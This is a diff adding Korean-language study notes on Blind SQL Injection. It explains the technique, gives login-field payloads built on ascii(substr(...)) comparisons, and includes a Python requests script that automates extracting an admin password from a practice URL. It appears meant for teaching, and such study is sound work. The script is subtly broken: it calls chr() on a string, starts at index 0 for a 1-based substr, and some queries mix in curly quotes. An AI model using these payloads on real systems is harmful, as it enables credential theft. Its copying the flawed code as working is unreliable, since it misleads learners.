@@ -104,3 +104,89 @@ SQL Injection 공격을 할 때에는 데이터베이스의 종류에 따라 조
 <br/><br/>
 
 ### Blind SQL Injection
+**질의 결과(SQL Injection 공격의 성공 여부)를 공격자가 화면에서 직접 확인하지 못할 때** 참/거짓 반환 결과 또는 정상적인 쿼리문을 보냈을 때와 삽입 공격이 성공했을 때의 차이점(시간 차이 등)으로 데이터를 획득하거나 취약성 여부를 판단하는 공격 기법
+* 한 바이트씩 비교하여 공격하는 방식 → 다른 공격에 비해 많은 시간을 들여야 함
+	- 공격을 자동화하는 스크립트를 작성하여 공격을 수행하면 시간을 단축시킬 수 있음
+* 공격하기 전에 이용자가 입력할 수 있는 모든 문자의 범위를 지정해야 함
+	- EX: 비밀번호의 경우 일반적으로 알파벳 대﹒소문자, 숫자, 그리고 특수문자로 이뤄지기 때문에 아스키 범위 중에서 해당 문자가 포함된 범위를 지정하여 공격 스크립트를 작성함
+
+<br/>
+
+#### Blind SQL Injection 실습 - Blind SQL Injection을 이용한 비밀번호 획득
+아이디(```uid```)와 비밀번호(```upw```)를 입력받고 DBMS의 user_table(```uid```와 ```upw```의 정보를 가지고 있는 테이블)에 조회하기 위한 쿼리(아래의 SQL 문)을 생성 및 실행하는 로그인 모듈
+```SQL
+# 로그인 페이지에서 uid와 upw에 아무것도 입력하지 않았을 때의 쿼리문
+SELECT uid FROM user_table WHERE uid=‘’ AND upw=‘’
+```
+* Blind SQL Injection 공격 시 사용하는 함수
+	| 함수 | 설명 |
+	|-----|---------|
+	| ascii(char) | 전달된 문자를 아스키 형태로 변환하는 함수 <br/> &nbsp; → ```ascii(‘a’)```의 실행 결과로 ‘a’ 문자의 아스키 값인 97을 반환함 |
+	| substr(string, position, length) | 문자열에서 지정한 위치(position)부터 길이(length)까지의 값을 가져옴 <br/> &nbsp; → ```substr(‘ABCD’, 2, 2)```의 실행 결과로 ‘BC’가 반환됨 |
+
+<br/>
+
+* Blind SQL Injection 공격 쿼리 (패스워드는 ‘strawberry’)
+	- 로그인 모듈에 다음과 같이 입력함(주석 문자는 DBMS에 따라 달라짐)
+		| uid | upw |
+		|-----|-----|
+		| admin' AND ascii(substr(upw, *시작위치*, 1))=*아스키코드* -- | 아무것도 입력하지 않음 |
+
+		+ 생성되는 쿼리문
+			```SQL
+			# 첫 번째 글자 구하기 (아스키 114 = ‘r’, 115 = ’s’)
+			SELECT * FROM user_table WHERE uid=‘admin’ AND ascii(substr(upw, 1, 1))=114 --' AND upw=‘’ # False
+			SELECT * FROM user_table WHERE uid=‘admin’ AND ascii(substr(upw, 1, 1))=115 --' AND upw=‘’ # True
+
+			# 두 번째 글자 구하기 (아스키 115 = ’s’, 116 = ’t’)
+			SELECT * FROM user_table WHERE uid=‘admin’ AND ascii(substr(upw, 2, 1))=115 --‘ AND upw=‘’ # False
+			SELECT * FROM user_table WHERE uid=‘admin’ AND ascii(substr(upw, 2, 1))=116 --' AND upw=‘’ # True
+			```
+
+<br/>
+
+* Blind SQL Injection 공격 스크립트 (공격 자동화)
+	- 파이썬의 requests 모듈을 이용해 자동화 스크립트 작성
+		+ 아스키 범위 중 이용자가 이용자가 입력할 수 있는 모든 문자의 범위를 먼저 지정 → 비밀번호의 경우 알파벳, 숫자, 특수문자로 이뤄지기 때문에 32부터 126까지의 모든 문자를 범위로 지정함
+	- 작성한 공격 스크립트(python 코드)
+		```python
+		#!/usr/bin/python3
+		
+		import requests
+		import string
+		
+		url = 'http://example.com/login' # 실습 URL
+		params = {
+			'uid': '',
+			'upw': ''
+		}
+		
+		# 비밀번호가 포함될 수 있는 문자를 string 모듈을 사용해 생성함
+		tc = string.ascii_letters + string.digits + string.punctuation
+		#abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~
+		
+		# uid 입력값에 해당하는 변수 query
+		query = '''
+		admin' and ascii(substr(upw, {idx}, 1)) = {val}--
+		'''
+		
+		# password를 저장할 변수
+		password = ''
+		
+		# 길이를 먼저 구하고 길이만큼 반복문을 돌릴 수도 있음
+		for idx in range(0, 20): # 한 바이트씩 모든 문자를 비교하는 반복문
+			for ch in tc:
+				params['uid'] = query.format(idx=idx, val=ord(ch)).strip("\n")
+				c = requests.get(url, params=params)
+				print(c.request.url)
+				if c.text.find("Login success") != -1: # 반환 결과가 참일 경우 페이지에 표시되는 "Login success" 문자열을 찾음
+					password += chr(ch) # 해당 결과를 반환하는 문자를 password 변수에 추가함
+					break
+		
+		print(f"Password is {password}") # admin 계정의 비밀번호를 출력함
+		```
+
+		+ 반복문을 마치면 비밀번호를 획득할 수 있음
+
+<br/>
+
